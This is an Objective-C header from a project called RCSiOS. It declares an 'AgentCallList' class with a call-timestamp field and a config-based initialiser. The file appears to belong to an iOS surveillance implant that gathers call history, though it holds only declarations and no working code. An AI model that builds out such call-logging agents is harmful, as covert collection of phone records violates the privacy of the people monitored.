/*
 *  RCSIAgentCallList.h
 *  RCSiOS
 *
 *  Created by Alfredo Pesoli 'revenge' on 5/18/11.
 *  Copyright 2011 HT srl. All rights reserved.
 */

#ifndef __RCSIAgentCallList_h__
#define __RCSIAgentCallList_h__

#import "RCSICommon.h"
#import "RCSILogManager.h"
#import "RCSIAgent.h"

@interface _i_AgentCallList : _i_Agent <Agents>
{
  int32_t mLastCallTimestamp;
}

- (id)initWithConfigData:(NSData*)aData;

@end

#endif // __RCSIAgentCallList_h__
